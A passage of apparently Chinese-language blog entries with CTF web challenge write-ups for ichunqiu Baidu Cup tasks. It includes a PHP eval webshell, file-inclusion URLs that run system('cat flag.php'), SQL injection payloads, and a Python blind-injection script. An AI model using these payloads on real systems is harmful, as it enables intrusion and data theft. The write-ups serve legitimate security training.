    <content type="html"><![CDATA[<h1 id="Blog-进阶篇"><a href="#Blog-进阶篇" class="headerlink" title="Blog-进阶篇"></a>Blog-进阶篇</h1><p>二次注入注出admin密码，登录之后发现manager.php文件包含不可用</p><p>file_manager_json.php　存在目录遍历</p><pre><code class="hljs http">http://1cc70b6f1ddf476b8b45fdd12c9575ac22e92863a9914995.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../../../../../../tmp/</code></pre><p>解题思路：利用manager.php自包含产生栈溢出，down掉程序，php自启程序，但是写入的$_FILES[‘tmp’]存储在/tmp中没有被删除。</p><p>新建selinclude.html</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"uploadForm"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span></span><span class="hljs-tag">    <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span></span><span class="hljs-tag">    <span class="hljs-attr">action</span>=<span class="hljs-string">"http://1cc70b6f1ddf476b8b45fdd12c9575ac22e92863a9914995.changame.ichunqiu.com/blog_manage/manager.php?module=manager&amp;name=php"</span>&gt;</span>    Upload FIles1:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file1"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"30"</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"submit"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre><p>上传webshell,manager.php会开始自包含，tmp缓存了上传的文件</p><p><img src="./1567328514226.png" srcset="/img/loading.gif" alt="1567328514226"></p><p>文件包含之，注意后缀不能为php，可以替换为phpt</p><pre><code class="hljs php">http:<span class="hljs-comment">//1cc70b6f1ddf476b8b45fdd12c9575ac22e92863a9914995.changame.ichunqiu.com/blog_manage/manager.php?module=../../../../../../tmp/phpJifDN5&amp;name=phpt&amp;a=highlight_file(%27../flag.php%27);</span><span class="hljs-comment"># flag</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">#flag&#123;426cb161-737f-427b-b883-971e0131d54c&#125;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'flag_is_here'</span></code></pre><h1 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h1><p>后台登录界面post存在sql二次注入</p><p>这里注入时候发现select会报错，但其实是语法报错，没有猜对列名个数。</p><pre><code class="hljs http">title=1&amp;content=ww','asa'),('aaa',(select+database()),'aaa# 数据库名字<span class="hljs-attribute">miniblog</span><span class="hljs-attribute"></span>title=1&amp;content=ww','asa'),('aaa',(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),'aaa # 数据库表名&lt;h1&gt;posts,users&lt;/h1&gt;&lt;p&gt;aaa&lt;/p&gt;&lt;br /&gt;title=1&amp;content=ww','asa'),('aaa',(select+group_concat(column_name)+from+information_schema.columns+where+table_name='users'),'aaa # 列名&lt;h1&gt;username,password&lt;/h1&gt;title=1&amp;content=ww','asa'),('aaa',(select+group_concat(password)+from users),'aaa＃　获取admin密码dbb616c5d935d8f34c12c291066d6fb7 =&gt; melody123</code></pre><pre><code class="hljs http">http://8901415292984cf78e4acca700e91176c71c006e356846dc.changame.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code></pre><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-string">'flag&#123;b8d4f345-668b-46bb-a15a-9b4a65cace2a&#125;'</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag_is_here'</span>;</code></pre><h1 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h1><p>题目提供的信息</p><p>文件包含点，登录注册点，phpinfo显示限制了open_basedir</p><p>脑洞点：session存储的路径正好位于open_basedir里，可以注册shell进行包含</p><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[a]);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs http">http://9ebfa3b3dab34432a0c20559c4a1d9a43a41844802e04b9c.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../../tmp/SESS/sess_sk52jocvh24j4ikjms18b4i3o7&amp;a=system(%27cat%20flag.php%27);</code></pre><p><img src="./1567322134120.png" srcset="/img/loading.gif" alt="1567322134120"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>百度杯十一月web题解</title>
    <link href="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h1><p>python SSTI注入</p><h1 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h1><p>jsfuck</p><h1 id="look"><a href="#look" class="headerlink" title="look"></a>look</h1><blockquote><p>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s  ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。  可以看到大写O和Ö是相等的</p></blockquote><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$con = mysql_connect(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">''</span>);mysql_query(<span class="hljs-string">"set names utf8"</span>);mysql_select_db(<span class="hljs-string">"ctf"</span>);<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">"REMOTE_ADDR"</span>]==<span class="hljs-string">'8.8.8.8'</span>)&#123;    $name = addslashes($_GET[<span class="hljs-string">'usern3me'</span>]);  <span class="hljs-comment">//对输入转义</span>&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">if</span>(stripos($_GET[<span class="hljs-string">'usern3me'</span>],<span class="hljs-string">'Bctf2O16'</span>)!==<span class="hljs-keyword">false</span>)&#123;         $name = <span class="hljs-string">'FUCK'</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        $name = addslashes($_GET[<span class="hljs-string">'usern3me'</span>]);    &#125;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">'hello '</span>.$name;$sql = <span class="hljs-string">"select * from admin where name='$name'"</span>;$result = mysql_query($sql);$num = mysql_num_rows($result);<span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br&gt;next ***.php'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><img src="./1567064130220.png" srcset="/img/loading.gif" alt="1567064130220"></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'path'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>]))&#123;    $path = $_GET[<span class="hljs-string">'path'</span>];    $name = <span class="hljs-string">"upload/"</span>.$_GET[<span class="hljs-string">'filename'</span>];&#125;<span class="hljs-keyword">else</span>&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">if</span>(strpos($name,<span class="hljs-string">'..'</span>) &gt; <span class="hljs-number">-1</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'WTF'</span>;    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">if</span>(strpos($path,<span class="hljs-string">'http://127.0.0.1/'</span>) === <span class="hljs-number">0</span>)&#123;    file_put_contents($name,file_get_contents($path));&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'path error'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>通过file_get_contents进行写shell，file_get_contents相当于访问一次url获取其中的内容</p><p>所以需要对里面的空格进行二次urlencode</p><p><img src="./1567065943828.png" srcset="/img/loading.gif" alt="1567065943828"></p><p>放在本地来看,若不对name内容进行url编码，http报400错误</p><blockquote><p>400 Bad Request 是由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。</p></blockquote><p>一般来说，URL只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号。比如，世界上有英文字母的网址”<a href="http://www.abc.com&quot;，但是没有希腊字母的网址&quot;http://www.aβγ.com&quot;（读作阿尔法-贝塔-伽玛.com）。这是因为网络标准[RFC" target="_blank" rel="noopener">http://www.abc.com&quot;，但是没有希腊字母的网址&quot;http://www.aβγ.com&quot;（读作阿尔法-贝塔-伽玛.com）。这是因为网络标准[RFC</a> 1738](<a href="http://www.ietf.org/rfc/rfc1738.txt)做了硬性规定：" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc1738.txt)做了硬性规定：</a></p><blockquote><p>“…Only alphanumerics [0-9a-zA-Z], the special characters “$-_.+!*’(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.”</p><p>W”只有字母和数字[0-9a-zA-Z]、一些特殊符号”$-_.+!*’(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。”</p></blockquote><p><img src="./1567066541351.png" srcset="/img/loading.gif" alt="1567066541351"></p><p>对其空格进行一次编码，即可正常访问并输入</p><p><img src="./1567066720675.png" srcset="/img/loading.gif" alt="1567066720675"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>百度杯十月web题解</title>
    <link href="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E6%9C%88web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E6%9C%88web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h1><pre><code class="hljs html">you are 123;if you are not 123,you can get the flag<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-comment">&lt;!--$hash=md5($sign.$key);the length of $sign is 8</span></code></pre><p>hash扩展攻击</p><p><img src="./1565252912269.png" srcset="/img/loading.gif" alt="1565252912269"></p><p>/Gu3ss_m3_h2h2.php</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;    <span class="hljs-keyword">private</span> $file = <span class="hljs-string">'Gu3ss_m3_h2h2.php'</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;file = $file;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-keyword">true</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">'Gu3ss_m3_h2h2.php'</span>) &#123;            <span class="hljs-comment">//the secret is in the f15g_1s_here.php</span>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">'Gu3ss_m3_h2h2.php'</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'var'</span>])) &#123;    $var = base64_decode($_GET[<span class="hljs-string">'var'</span>]);    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/[oc]:\d+:/i'</span>, $var)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        @unserialize($var);    &#125;&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-string">"Gu3ss_m3_h2h2.php"</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>对象加＋绕过正则、修改对象个数绕过__wakeup</p><p><img src="./1565255882028.png" srcset="/img/loading.gif" alt="1565255882028"></p><p>使用可变变量绕过</p><p><img src="./1565257216955.png" srcset="/img/loading.gif" alt="1565257216955"></p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'val'</span>])) &#123;    $val = $_GET[<span class="hljs-string">'val'</span>];    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'$value="'</span> . addslashes($val) . <span class="hljs-string">'";'</span>);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">'hahaha!'</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><h1 id="fuzzing"><a href="#fuzzing" class="headerlink" title="fuzzing"></a>fuzzing</h1><p>X-Forwarded-For: 10.0.0.0 得到m4nage.php</p><p>post带参数key=1访问</p><pre><code class="hljs html">key is not right,md5(key)==="1b4167610ba3f2ac426a68488dbd89be",and the key is ichunqiu***,the * is in [a-z0-9]</code></pre><p>脚本跑一下,</p><p>ichunqiu105,且得到下一个文件xx00xxoo.php</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> subprocess<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_key_txt</span><span class="hljs-params">()</span>:</span>c=string.ascii_lowercase+string.digitsmd=[<span class="hljs-string">'ichunqiu'</span>+<span class="hljs-string">''</span>.join(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> product(c,repeat=<span class="hljs-number">3</span>)]<span class="hljs-keyword">with</span> open(<span class="hljs-string">'md.txt'</span>,<span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> md:f.write(hashlib.md5(k).hexdigest()+<span class="hljs-string">" --&gt; "</span>+k+<span class="hljs-string">'\n'</span>)get_key_txt()n=subprocess.check_output([<span class="hljs-string">"grep"</span>,<span class="hljs-string">"1b4167610ba3f2ac426a68488dbd89be"</span>,<span class="hljs-string">"md.txt"</span>]).split()[<span class="hljs-number">2</span>]print(<span class="hljs-string">"The last key is =&gt; "</span>+n)url=<span class="hljs-string">"http://be25aa0704534a77b936a0ecb351d1cd4f3f2cadaef64269.changame.ichunqiu.com/Challenges/m4nage.php"</span>data=&#123;<span class="hljs-string">"key"</span>:n&#125;header=&#123;<span class="hljs-string">"X-Forwarded-For"</span>:<span class="hljs-string">"10.0.0.0"</span>&#125;rep=requests.post(url=url,data=data,headers=header)print(<span class="hljs-string">"Text: "</span>+rep.text)</code></pre><h2 id="x0-txt"><a href="#x0-txt" class="headerlink" title="x0.txt"></a>x0.txt</h2><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">authcode</span><span class="hljs-params">($string, $operation = <span class="hljs-string">'DECODE'</span>, $key = <span class="hljs-string">''</span>, $expiry = <span class="hljs-number">0</span>)</span> </span>&#123;$ckey_length = <span class="hljs-number">4</span>;$key = md5($key ? $key : UC_KEY);$keya = md5(substr($key, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>));$keyb = md5(substr($key, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>));$keyc = $ckey_length ? ($operation == <span class="hljs-string">'DECODE'</span> ? substr($string, <span class="hljs-number">0</span>, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : <span class="hljs-string">''</span>;$cryptkey = $keya . md5($keya . $keyc);$key_length = strlen($cryptkey);$string = $operation == <span class="hljs-string">'DECODE'</span> ? base64_decode(substr($string, $ckey_length)) : sprintf(<span class="hljs-string">'%010d'</span>, $expiry ? $expiry + time() : <span class="hljs-number">0</span>) . substr(md5($string . $keyb), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>) . $string;$string_length = strlen($string);$result = <span class="hljs-string">''</span>;$box = range(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);$rndkey = <span class="hljs-keyword">array</span>();<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt;= <span class="hljs-number">255</span>; $i++) &#123;$rndkey[$i] = ord($cryptkey[$i % $key_length]);&#125;<span class="hljs-keyword">for</span> ($j = $i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">256</span>; $i++) &#123;$j = ($j + $box[$i] + $rndkey[$i]) % <span class="hljs-number">256</span>;$tmp = $box[$i];$box[$i] = $box[$j];$box[$j] = $tmp;&#125;<span class="hljs-keyword">for</span> ($a = $j = $i = <span class="hljs-number">0</span>; $i &lt; $string_length; $i++) &#123;$a = ($a + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;$j = ($j + $box[$a]) % <span class="hljs-number">256</span>;$tmp = $box[$a];$box[$a] = $box[$j];$box[$j] = $tmp;$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="hljs-number">256</span>]));&#125;<span class="hljs-keyword">if</span> ($operation == <span class="hljs-string">'DECODE'</span>) &#123;<span class="hljs-keyword">if</span> ((substr($result, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) == <span class="hljs-number">0</span> || substr($result, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) - time() &gt; <span class="hljs-number">0</span>) &amp;&amp; substr($result, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>) == substr(md5(substr($result, <span class="hljs-number">26</span>) . $keyb), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>)) &#123;<span class="hljs-keyword">return</span> substr($result, <span class="hljs-number">26</span>);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">''</span>;&#125;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> $keyc . str_replace(<span class="hljs-string">'='</span>, <span class="hljs-string">''</span>, base64_encode($result));&#125;&#125;</code></pre><p>解密不想看，直接看wp</p><p>flag{44aa62f7-bbce-4f35-ac37-c56e6b5bdabf}</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> authcode(<span class="hljs-string">'ef67mht6rNN84wfHLDCCOmrNosllksXT53VLjFn/QDvNujC3GpURl5PTXiNenJRQSTrmzUENWRJQkEptBAxsrsN4Tsc+AC4'</span>,$operation = <span class="hljs-string">'DECODE'</span>, $key = <span class="hljs-string">'ichunqiu105'</span>, $expiry = <span class="hljs-number">0</span>);</code></pre><h1 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h1><p>没啥思路，偷偷瞄了眼wp，用报错获取更多的信息。GET改为POST,题目提示了github链接<a href="https://github.com/c62s/django" target="_blank" rel="noopener">https://github.com/c62s/django</a></p><p>晚上脚本都打不通，自己写了个也不行。估计版本更新了</p><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><pre><code class="hljs pgsql">usernam<span class="hljs-string">e' or 1=1# =&gt; 密码错误</span><span class="hljs-string">username'</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">0</span># =&gt; 用户名不存在</code></pre><p>存在布尔盲注，但是字符串截取都被过滤了不能使用</p><p>使用like 进行盲注</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">'http://2941b675a9434990a630fd82fd83ff2698935fc09faf4e0c.changame.ichunqiu.com/Challenges/login.php'</span>payloads = string.ascii_letters + string.digitstemp = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):    print(<span class="hljs-string">"hello"</span>)    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payloads:        payload = temp + p        name = <span class="hljs-string">f"username' or `p3ss_w0rd` like '<span class="hljs-subst">&#123;payload&#125;</span>%'#"</span>        data = dict(username=name, passwrod=<span class="hljs-string">'test'</span>)        print(data)        res = requests.post(url,data=data)        res.encoding=<span class="hljs-string">'utf-8'</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">"密码错误"</span> <span class="hljs-keyword">in</span> res.text:            temp = temp + p            print(temp.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">'.'</span>))            <span class="hljs-keyword">break</span></code></pre><p>用户名：bctf3dm1n</p><p>密码：2bfb1532857ddc0033fdae5bde3facdf =&gt; adminqwe123666</p><p>对回显的.bctfg1t进行恢复</p><p><img src="./1566746206295.png" srcset="/img/loading.gif" alt="1566746206295"></p><p>题目提示缓存文件，使用git cat-file 获取对象</p><pre><code class="hljs bash">osword@fighting:~/Desktop/ctftools/GitHack-master/res/.git/objects/a1$ git cat-file -p a17d89c6219a1bcca6cb3b40526cc5b9da715a6e&lt;?php<span class="hljs-built_in">echo</span> <span class="hljs-string">'71ec9d5ca5580c58d1872962c596ea71.php'</span>;//niubi 666?&gt;</code></pre><p>flag{43987fff-6f02-456f-9d7f-df588ea3a906}</p><h1 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h1><p>用晚上的wp都试了一遍,无法反弹shell遂作罢</p><h1 id="Vld"><a href="#Vld" class="headerlink" title="Vld"></a>Vld</h1><p>拿到1chunqiu.zip进行审计</p><p>register.php无论怎么注册都是失败的</p><p>login.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span> <span class="hljs-string">'dbmysql.class.php'</span>;<span class="hljs-keyword">require_once</span> <span class="hljs-string">'config.inc.php'</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'number'</span>]))&#123;    $db = <span class="hljs-keyword">new</span> mysql_db();    $username = $db-&gt;safe_data($_POST[<span class="hljs-string">'username'</span>]);    $password = $db-&gt;my_md5($_POST[<span class="hljs-string">'password'</span>]);    $number = is_numeric($_POST[<span class="hljs-string">'number'</span>]) ? $_POST[<span class="hljs-string">'number'</span>] : <span class="hljs-number">1</span>;    $username = trim(str_replace($number, <span class="hljs-string">''</span>, $username));    $sql = <span class="hljs-string">"select * from"</span>.<span class="hljs-string">"`"</span>.table_name.<span class="hljs-string">"`"</span>.<span class="hljs-string">"where username="</span>.<span class="hljs-string">"'"</span>.<span class="hljs-string">"$username"</span>.<span class="hljs-string">"'"</span>;    $row = $db-&gt;query($sql);    $result = $db-&gt;fetch_array($row);    <span class="hljs-keyword">if</span>($row)&#123;        <span class="hljs-keyword">if</span>($result[<span class="hljs-string">"number"</span>] === $number &amp;&amp; $result[<span class="hljs-string">"password"</span>] === $password)&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('nothing here!')&lt;/script&gt;"</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;</span><span class="hljs-string">            alert('密码错误，老司机翻车了!');</span><span class="hljs-string">            function jumpurl()&#123;</span><span class="hljs-string">                location='login.html';</span><span class="hljs-string">            &#125;</span><span class="hljs-string">            setTimeout('jumpurl()',1000); </span><span class="hljs-string">            &lt;/script&gt;"</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">exit</span>(mysql_error());    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;</span><span class="hljs-string">            alert('用户名密码不能为空!');</span><span class="hljs-string">            function jumpurl()&#123;</span><span class="hljs-string">                location='login.html';</span><span class="hljs-string">            &#125;</span><span class="hljs-string">            setTimeout('jumpurl()',1000);</span><span class="hljs-string">        &lt;/script&gt;"</span>;&#125; <span class="hljs-meta">?&gt;</span></code></pre><p>sql查询语句可控点在username，但是username被addlsashes转义，但是代码有一行很突兀</p><pre><code class="hljs php">$username = trim(str_replace($number, <span class="hljs-string">''</span>, $username));</code></pre><p>猜测可以逃逸注入的单引号,注入%00=&gt;\0 再替换0为空逃逸单引号</p><p><img src="./1566910083097.png" srcset="/img/loading.gif" alt="1566910083097"></p><p><img src="./1566910960937.png" srcset="/img/loading.gif" alt="1566910960937"></p><p><code>number=0&amp;username=%00&#39; and extractvalue(1,substr((select flag from flag),1,37))#&amp;password=zxasqw159</code></p><p>{4cb92058-e866-4aed-9751-15e5706</p><p><code>number=0&amp;username=%00&#39; and extractvalue(1,substr((select flag from flag),6,37))#&amp;password=zxasqw159</code></p><p>cb92058-e866-4aed-9751-15e570630</p><p>往后面再取一直显示”}”flag一直不对，语法没错，估计环境崩了</p><h1 id="Not-Found"><a href="#Not-Found" class="headerlink" title="Not Found"></a>Not Found</h1><p>题目提示The requested url… 修改请求方法，OPTIONS时候发生重定向/?f=1.php</p><p>404.php为.htaccess设置，尝试访问?f=.htaccess</p><p><img src="./1566973999262.png" srcset="/img/loading.gif" alt="1566973999262"></p><p>访问8d829d8568e46455104209db5cd9228d.html 提示ip不正确,X-forwarded-for不行，client-ip</p><p>获取客户端ip : HTTP_CLINET-IP、X-FORWARDED-FOR 、REMOTE_ADDR</p><pre><code class="hljs php">$_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]; <span class="hljs-comment">//访问端（有可能是用户，有可能是代理的）IP</span>$_SERVER[<span class="hljs-string">'HTTP_CLIENT_IP'</span>]; <span class="hljs-comment">//代理端的（有可能存在，可伪造）</span>$_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]; <span class="hljs-comment">//用户是在哪个IP使用的代理（有可能存在，也可以伪造）</span></code></pre><p><img src="./1566974017377.png" srcset="/img/loading.gif" alt="1566974017377"></p><h1 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h1><p>代码一把梭解验证码，以为注入万能密码直接绕过</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> reurl=<span class="hljs-string">"http://e71f0e4875d4466abd30cff7afc1b7a6ce8e9f6739514460.changame.ichunqiu.com/Challenges/action.php?action=login"</span>sess=requests.session()rep=sess.get(url=url)<span class="hljs-comment">#print(rep.text)</span>m = re.search(<span class="hljs-string">r'substr\(md5\(captcha\), 0, 6\)=([0-9a-f]&#123;6&#125;)'</span>,rep.text).group(<span class="hljs-number">1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(k)</span>:</span>    <span class="hljs-keyword">return</span> hashlib.md5((k.encode(<span class="hljs-string">'utf-8'</span>))).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">demd5</span><span class="hljs-params">(m)</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">999999999999</span>):        <span class="hljs-keyword">if</span> str(md5(str(i)))[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == m:            print(<span class="hljs-string">"captcha is =&gt; "</span>+str(i))            <span class="hljs-keyword">return</span> iusername=<span class="hljs-string">"admin' and '1'='1"</span>data=&#123;    <span class="hljs-string">'username'</span>:username,    <span class="hljs-string">'password'</span>:<span class="hljs-string">'pass'</span>,    <span class="hljs-string">'captcha_md5'</span>: demd5(m),    <span class="hljs-string">'submit'</span>:<span class="hljs-string">'Submit'</span>&#125;print(data)rep2=sess.post(url=url,data=data)print(rep2.status_code)print(rep2.text)</code></pre><p>a.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">"Do what you want to do, web dog, flag is in the web root dir"</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>找到读取文件的接口,发现过滤了符号+/无法用伪协议任意读。访问/var/www/html/challenges/flag.php得到文件</p><p><img src="./1566977730530.png" srcset="/img/loading.gif" alt="1566977730530"></p><p>php5.6特性：对ascii&gt;0x7f 默认作为字符串</p><p><img src="./1566978513914.png" srcset="/img/loading.gif" alt="1566978513914"></p><h1 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h1><p>.git泄露</p><p><img src="./1566979276424.png" srcset="/img/loading.gif" alt="1566979276424"></p><p><img src="./1566979288784.png" srcset="/img/loading.gif" alt="1566979288784"></p><p>.swo泄露 